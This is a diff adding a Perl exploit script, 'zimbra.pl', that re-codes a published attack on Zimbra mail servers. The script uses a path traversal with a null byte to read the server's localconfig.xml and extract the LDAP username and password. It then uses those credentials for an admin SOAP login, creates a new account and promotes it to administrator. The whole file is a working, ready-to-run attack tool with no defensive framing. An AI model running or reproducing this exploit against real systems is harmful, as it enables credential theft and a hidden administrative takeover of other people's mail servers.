@@ -1,0 +1,130 @@
+#!/usr/bin/perl
+
+#===================================================
+# zimbra.pl v1.0 by Vrs-hCk
+# Exploit Re-Coded in Perl Scripting :)
+# Author: http://www.exploit-db.com/exploits/30085/
+#===================================================
+
+use HTTP::Request;
+use LWP::UserAgent;
+
+my $target   = $ARGV[0];
+my $port     = $ARGV[1];
+my $user_id  = $ARGV[2];
+my $passwd   = $ARGV[3];
+
+my $vuln   = '/res/TemplateMsg.js.zgz?skin=../../../../../../../../../opt/zimbra/conf/localconfig.xml%00';
+my $uagent = 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36';
+
+if (@ARGV != 4) { print "\n[usage] perl $0 mail.example.com 7071 email_id password\n\n"; exit(); }
+
+printf "\n
+===================================================
+ zimbra.pl v1.0 by Vrs-hCk
+ Exploit Re-Coded in Perl Scripting :)
+ Author: http://www.exploit-db.com/exploits/30085/
+===================================================
+   Please wait ...
+\n";
+
+my $check = get("https://$target:$port".$vuln);
+
+my ($zimbra_user,$zimbra_pass);
+if ($check =~ /if \(\!window\.TemplateMsg\)/) {
+    print ">> $target is Vuln!\n";
+    print ">> Catching Zimbra Configurations ...\n\n";
+    $check =~ s/\na\["//g;
+    if ($check =~ /name=\\"zimbra_user\\">";<value>(.+?)<\/value>/i) {
+        $zimbra_user = $1;
+        print "[+] Zimbra Username   : $zimbra_user\n";
+    }
+    if ($check =~ /name=\\"zimbra_ldap_password\\">";<value>(.+?)<\/value>/i) {
+        $zimbra_pass = $1;
+        print "[+] Zimbra Password   : $zimbra_pass\n";
+    }
+    get_auth_token($zimbra_user,$zimbra_pass);
+}
+else {
+    print ">> Host is not vulnerable!\n\n";
+}
+
+sub get_auth_token {
+    my $user = $_[0];
+    my $pass = $_[1];
+    my $xml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><env:Envelope xmlns:env=\"http://www.w3.org/2003/05/soap-envelope\" xmlns:ns1=\"urn:zimbraAdmin\" xmlns:ns2=\"urn:zimbraAdmin\"><env:Header><ns2:context/></env:Header><env:Body><ns1:AuthRequest><account by=\"name\">$user</account><password>$pass</password></ns1:AuthRequest></env:Body></env:Envelope>";
+    my $res = post("https://$target:$port/service/admin/soap",$xml,"urn:zimbraAdmin#AuthRequest");
+    if ($res =~ /<authToken>(.*)<\/authToken>/i) {
+        $auth_token = $1;
+        print "[+] Zimbra Auth Token : Got It :)\n";
+    }
+    exploit();
+}
+
+sub exploit {
+    my ($zimbra_domain);
+    my $domain_soap_body = "<GetAllDomainsRequest xmlns=\"urn:zimbraAdmin\"></GetAllDomainsRequest>";
+    my $domain_soap_req = soap_request($domain_soap_body);
+    if ($domain_soap_req =~ /<a n="zimbraDomainName">(.+?)<\/a>/) {
+        $zimbra_domain = $1;
+        print "[+] Zimbra Domain Name: $zimbra_domain\n\n";
+    }
+    print ">> Creating Account $user_id\@$zimbra_domain ...\n\n";
+    my $create_account_soap_body = "<CreateAccountRequest xmlns=\"urn:zimbraAdmin\"><name>$user_id\@$zimbra_domain</name><password>$passwd</password></CreateAccountRequest>";
+    my $account_soap_req = soap_request($create_account_soap_body);
+    if ($account_soap_req =~ /account id="(.*)" name="/i) {
+        my $uid = $1;
+        my $get_admin_soap_body = "<ModifyAccountRequest xmlns=\"urn:zimbraAdmin\"><id>$uid</id><a n=\"zimbraIsAdminAccount\">TRUE</a></ModifyAccountRequest>";
+        my $check_account_status = soap_request($get_admin_soap_body);
+        print "[@] Login Credentials!\n";
+        print "[+] Login URL : https://$target:7071/zimbraAdmin/\n";
+        print "[+] Account   : $user_id\@$zimbra_domain\n";
+        print "[+] Password  : $passwd\n\n";
+        print ">> Successfully Exploited!\n\n";
+    }
+}
+
+sub soap_request {
+    my $soap_body = $_[0];
+    my $soap_data = "<soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope\"><soap:Header><context xmlns=\"urn:zimbra\"><authToken>$auth_token</authToken></context></soap:Header><soap:Body>$soap_body</soap:Body></soap:Envelope>";
+    my $soap_call = post("https://$target:$port/service/admin/soap",$soap_data,"urn:zimbraAdmin");
+    if ($soap_call =~ /Error/) {
+        if ($soap_call =~ /<soap:Text>(.*?)<\/soap:Text>/i) {
+            print "[!] Error: $1\n";
+            exit;
+        }
+    }
+    else {
+        return $soap_call;
+    }
+}
+
+sub get {
+    my $url = $_[0];
+    my $ua = LWP::UserAgent->new(ssl_opts => {verify_hostname=>0});
+    $ua->agent("$uagent");
+    $ua->timeout(15);
+    my $req = HTTP::Request->new(GET => $url);
+    $req->accept_decodable;
+    my $res = $ua->request($req);
+    if ($res->is_error) { print "\n[!] ".$res->status_line, "\n"; }
+    return $res->decoded_content;
+}
+
+sub post {
+    my $url = $_[0];
+    my $data = $_[1];
+    my $action = $_[2];
+    my $ua = LWP::UserAgent->new(ssl_opts => {verify_hostname=>0});
+    $ua->agent("$uagent");
+    $ua->timeout(15);
+    $ua->max_redirect(3);
+    push @{$ua->requests_redirectable}, 'POST';
+    my $req = HTTP::Request->new(POST => $url);
+    $req->accept_decodable;
+    $req->content_type("application/soap+xml; charset=utf-8; action=\"$action\"");
+    $req->content("$data");
+    my $res = $ua->request($req);
+    if ($res->is_error) { print "\n[!] ".$res->status_line, "\n"; }
+    return $res->decoded_content;
+}
